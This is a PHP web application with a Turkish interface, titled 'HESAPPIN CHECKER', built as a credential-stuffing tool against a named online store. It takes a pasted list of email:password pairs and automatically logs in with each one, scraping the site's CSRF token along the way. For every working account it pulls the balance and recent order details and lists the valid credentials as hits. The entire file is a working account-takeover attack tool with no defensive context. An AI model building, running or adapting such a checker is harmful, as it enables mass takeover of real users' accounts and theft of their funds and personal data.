<?php
session_start();
// Güvenlik: Oturum kontrolü
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);

    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');
    
    $cookie = dirname(__FILE__) . "/sess_" . md5($user . time()) . ".txt";

    function request($url, $post = null, $headers = [], $ck) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        
        $defaultHeaders = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Accept: */*"
        ];

        if ($post !== null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($defaultHeaders, $headers));
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }

    // 1. ADIM: CSRF Token Al (GET)
    $source = request("https://hesappin.com/hesap", null, [], $cookie);
    preg_match('/name="csrf_test_name" value="(.*?)"/', $source, $csrf_match);
    $csrf = $csrf_match[1] ?? '';

    // 2. ADIM: Login (POST)
    $postFields = "csrf_test_name=$csrf&mail=".urlencode($user)."&password=".urlencode($pass)."&btn+btn-primary+w-100=Giri%C5%9F+Yap";
    $loginRes = request(
        "https://hesappin.com/login/loginClient",
        $postFields,
        ["Content-Type: application/x-www-form-urlencoded", "Referer: https://hesappin.com/hesap"],
        $cookie
    );

    // 3. ADIM: Profil Kontrolü
    $clientSource = request("https://hesappin.com/client", null, [], $cookie);

    if (strpos($clientSource, 'class="mail"') !== false) {
        
        // Bakiye Çekimi
        preg_match('/<div class="money">(.*?)<\/div>/s', $clientSource, $bakiyeMatch);
        $bakiye = trim(strip_tags($bakiyeMatch[1] ?? '0.00'));

        // Ürün Sayfası Çekimi
        $prodSource = request("https://hesappin.com/client/product", null, [], $cookie);
        
        preg_match('/<div class="title-mini">Tarih<\/div>.*?<div class="text">(.*?)<\/div>/s', $prodSource, $tarihMatch);
        $tarih = trim($tarihMatch[1] ?? '-');

        preg_match('/<div class="title-mini">Fiyat<\/div>.*?<div class="text">(.*?)<\/div>/s', $prodSource, $fiyatMatch);
        $fiyat = trim($fiyatMatch[1] ?? '-');

        preg_match('/alt="" class="img-product">.*?<div class="text">(.*?)<\/div>/s', $prodSource, $urunMatch);
        $urun = trim($urunMatch[1] ?? 'Ürün Yok');

        echo json_encode([
            'status' => 'success',
            'user' => $user, 'pass' => $pass,
            'bakiye' => $bakiye,
            'tarih' => $tarih,
            'fiyat' => $fiyat,
            'urun' => $urun
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }

    if(file_exists($cookie)) @unlink($cookie);
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>HESAPPIN CHECKER v2.6</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #06090f; --card: #0d1117; --primary: #00acee; --success: #2ea043; --danger: #f85149; --border: #30363d; --text: #f0f6fc; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; }
        .container { max-width: 1400px; margin: 0 auto; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .header-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; }
        .stat-card b { display: block; font-size: 24px; margin-top: 5px; }
        .main-grid { display: grid; grid-template-columns: 1fr 2.5fr; gap: 20px; }
        textarea { width: 100%; height: 250px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: var(--primary); padding: 10px; font-family: monospace; outline: none; margin-bottom: 10px; resize: none; }
        .scroll-box { height: 600px; overflow-y: auto; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 15px; padding: 15px; }
        .hit-item { background: var(--card); border: 1px solid var(--primary); border-radius: 10px; padding: 15px; margin-bottom: 15px; animation: slideIn 0.3s ease; }
        .btn { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; text-decoration: none; display: inline-block; text-align: center; }
        .btn-danger { background: var(--danger); }
        .btn-logout { background: transparent; border: 1px solid var(--danger); color: var(--danger); padding: 5px 12px; font-size: 11px; border-radius: 8px; margin-left: 15px; transition: 0.3s; }
        .btn-logout:hover { background: var(--danger); color: white; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <nav class="navbar">
        <div class="logo">
            <i class="fas fa-shield-halved" style="color:var(--primary)"></i>
            <span style="font-weight:900; margin-left: 8px;">HESAPPIN <span style="color:var(--primary)">ULTRA</span> CHECKER</span>
        </div>
        <div style="display: flex; align-items: center;">
            <a href="index.php" style = "font-size: 12px; color "class="btn-logout"><i class="fas fa-sign-out-alt"></i> ÇIKIŞ YAP</a>
        </div>
    </nav>

    <div class="header-stats">
        <div class="stat-card" style="border-top: 4px solid var(--primary);">KALAN <b id="s_total">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--success);">BAŞARILI <b id="s_hit">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--danger);">HATALI <b id="s_fail">0</b></div>
    </div>

    <div class="main-grid">
        <div class="side-panel">
            <textarea id="accs" placeholder="email:sifre"></textarea>
            <button id="actionBtn" onclick="toggleProcess()" class="btn">TARAMAYI BAŞLAT</button>
            <div class="scroll-box" id="fullLog" style="height: 315px; margin-top:15px; font-size:11px; color:#8b949e;"></div>
        </div>
        <div class="hit-panel">
            <div class="scroll-box" id="hitLog"></div>
        </div>
    </div>
</div>

<script>
let isRunning = false;
let hits = 0, fails = 0;

function appendHit(res) {
    const hitsBox = document.getElementById('hitLog');
    const item = `
    <div class="hit-item">
        <div style="padding:10px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center;">
            <b style="color:var(--primary); font-size:16px;">${res.user}:${res.pass}</b>
            <span style="background:var(--success); color:white; padding:3px 10px; border-radius:6px; font-size:12px; font-weight:bold;">${res.bakiye}</span>
        </div>
        <div style="padding:12px; display:grid; grid-template-columns: repeat(3, 1fr); gap:10px; font-size:11px;">
            <div><small style="color:#8b949e">SON ÜRÜN</small><br><b>${res.urun}</b></div>
            <div><small style="color:#8b949e">SİPARİŞ TARİHİ</small><br><b>${res.tarih}</b></div>
            <div><small style="color:#8b949e">SİPARİŞ TUTARI</small><br><b>${res.fiyat}</b></div>
        </div>
    </div>`;
    hitsBox.innerHTML = item + hitsBox.innerHTML;
}

async function process() {
    const accs = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
    if(!accs.length) return alert("Liste boş!");

    isRunning = true;
    const btn = document.getElementById('actionBtn');
    btn.innerText = "DURDUR"; btn.classList.add('btn-danger');

    for (let i = 0; i < accs.length; i++) {
        if (!isRunning) break;
        
        document.getElementById('s_total').innerText = accs.length - i;
        const [u, p] = accs[i].trim().split(':');
        const fd = new FormData();
        fd.append('user', u); fd.append('pass', p);

        try {
            const response = await fetch('?action=check', { method: 'POST', body: fd });
            const res = await response.json();
            const log = document.getElementById('fullLog');

            if(res.status === 'success') {
                hits++;
                document.getElementById('s_hit').innerText = hits;
                log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] <span style="color:var(--success)">HIT</span> -> ${u}</div>` + log.innerHTML;
                appendHit(res);
            } else {
                fails++;
                document.getElementById('s_fail').innerText = fails;
                log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] <span style="color:var(--danger)">FAIL</span> -> ${u}</div>` + log.innerHTML;
            }
        } catch (e) { console.error(e); }
    }
    isRunning = false;
    btn.innerText = "TARAMAYI BAŞLAT"; btn.classList.remove('btn-danger');
}

function toggleProcess() { isRunning ? (isRunning = false) : process(); }
</script>
</body>
</html>